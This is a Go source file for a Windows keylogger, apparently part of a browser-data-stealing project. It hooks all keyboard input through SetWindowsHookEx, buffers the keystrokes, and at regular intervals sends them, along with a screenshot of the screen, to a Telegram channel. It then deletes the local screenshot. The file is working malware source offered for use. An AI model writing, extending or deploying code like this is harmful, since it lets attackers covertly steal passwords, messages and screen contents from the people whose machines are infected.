// keylogger.go
package keylogger

import (
    "os"
    "runtime"
    "sync"
    "time"
    "unsafe"

    "github.com/GiwaMIcheal/HackBrowserData/config"
    "github.com/GiwaMIcheal/HackBrowserData/telegram"
    "github.com/GiwaMIcheal/HackBrowserData/config.go/screenshot"
    "golang.org/x/sys/windows"
)

var (
    user32                  = windows.NewLazySystemDLL("user32.dll")
    procSetWindowsHookEx    = user32.NewProc("SetWindowsHookExW")
    procCallNextHookEx      = user32.NewProc("CallNextHookEx")
    procUnhookWindowsHookEx = user32.NewProc("UnhookWindowsHookEx")
    procGetMessage          = user32.NewProc("GetMessageW")
)

const (
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN     = 0x0100
    WM_SYSKEYDOWN  = 0x0104
)

type KBDLLHOOKSTRUCT struct {
    VkCode     uint32
    ScanCode   uint32
    Flags      uint32
    Time       uint32
    ExtraInfo  uintptr
}

var (
    hookHandle windows.HHOOK
    bufferMu   sync.Mutex
    keyBuffer  []rune
    stopChan   = make(chan struct{})
)

// Start installs the low-level keyboard hook in its own OS thread and begins periodic flushing.
// It should be called once at startup. Returns error if hooking fails.
func Start() error {
    // Start a dedicated goroutine for the hook and message loop
    errChan := make(chan error, 1)
    go func() {
        // Lock this goroutine to its OS thread for the hook
        runtime.LockOSThread()
        // Install the low-level keyboard hook
        h, _, err := procSetWindowsHookEx.Call(
            uintptr(WH_KEYBOARD_LL),
            windows.NewCallback(lowLevelKeyboardProc),
            0,
            0,
        )
        if h == 0 {
            errChan <- err
            return
        }
        hookHandle = windows.HHOOK(h)
        // Signal success
        errChan <- nil
        // Run message loop until Stop() is called
        messageLoop()
        // After messageLoop exits, unhook if still hooked
        if hookHandle != 0 {
            procUnhookWindowsHookEx.Call(uintptr(hookHandle))
            hookHandle = 0
        }
    }()

    // Wait for hook installation result
    if err := <-errChan; err != nil {
        return err
    }
    // Start periodic flush in background
    go periodicFlush()
    return nil
}

// Stop signals the message loop to exit and unhooks the keyboard hook.
func Stop() {
    // Closing stopChan will cause messageLoop to exit
    select {
    case <-stopChan:
        // already closed
    default:
        close(stopChan)
    }
}

// lowLevelKeyboardProc is called on keyboard events. Buffers printable keys.
func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
    if nCode == 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        kbs := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
        vk := kbs.VkCode
        str := vkToString(vk)
        if str != "" {
            bufferMu.Lock()
            keyBuffer = append(keyBuffer, []rune(str)...)
            bufferMu.Unlock()
        }
    }
    ret, _, _ := procCallNextHookEx.Call(0, uintptr(nCode), wParam, lParam)
    return ret
}

// messageLoop pumps Windows messages to keep the hook alive.
// It exits when Stop() is called.
func messageLoop() {
    var msg struct {
        hwnd   uintptr
        msg    uint32
        wParam uintptr
        lParam uintptr
        time   uint32
        pt     struct{ x, y int32 }
    }
    for {
        // Peek or GetMessage with timeout? Here: GetMessage blocks until a message arrives or WM_QUIT.
        r, _, _ := procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
        if r == 0 {
            // WM_QUIT received
            break
        }
        // Check if Stop() was called
        select {
        case <-stopChan:
            // Post a quit message to break GetMessage
            windows.PostQuitMessage(0)
            return
        default:
            // continue looping; low-level hook does not require TranslateMessage/DispatchMessage here
        }
    }
}

// vkToString maps virtual-key codes to readable strings.
func vkToString(vk uint32) string {
    switch vk {
    case 0x20:
        return " "
    case 0x0D:
        return "[ENTER]\n"
    case 0x09:
        return "[TAB]"
    case 0x10, 0xA0, 0xA1:
        return "[SHIFT]"
    case 0x11, 0xA2, 0xA3:
        return "[CTRL]"
    case 0x1B:
        return "[ESC]"
    case 0x2E:
        return "[DEL]"
    default:
        // Alphanumeric
        if (vk >= 0x30 && vk <= 0x39) || (vk >= 0x41 && vk <= 0x5A) {
            return string(rune(vk))
        }
    }
    return ""
}

// periodicFlush runs in background, flushing keylogs and screenshots every FlushIntervalSec.
func periodicFlush() {
    ticker := time.NewTicker(time.Duration(config.FlushIntervalSec) * time.Second)
    defer ticker.Stop()
    for {
        select {
        case <-ticker.C:
            flushAndSend()
        case <-stopChan:
            return
        }
    }
}

// flushAndSend sends buffered keystrokes and a screenshot to Telegram.
func flushAndSend() {
    // 1. Flush key buffer
    bufferMu.Lock()
    if len(keyBuffer) > 0 {
        text := string(keyBuffer)
        keyBuffer = nil
        bufferMu.Unlock()
        caption := "[Keylogs] " + time.Now().Format("2006-01-02 15:04:05")
        if err := telegram.SendText(caption + "\n" + text); err != nil {
            // Optionally log or handle the error
            // fmt.Fprintf(os.Stderr, "SendText error: %v\n", err)
        }
    } else {
        bufferMu.Unlock()
    }
    // 2. Capture and send screenshot
    timestamp := time.Now().Format("20060102_150405")
    screenshotPath := config.ScreenshotDir + string(os.PathSeparator) + "screenshot_" + timestamp + ".png"
    if err := screenshot.CaptureAndSave(screenshotPath); err == nil {
        if err := telegram.SendPhoto(screenshotPath); err != nil {
            // Optionally log or handle the error
            // fmt.Fprintf(os.Stderr, "SendPhoto error: %v\n", err)
        }
        _ = os.Remove(screenshotPath)
    }
}
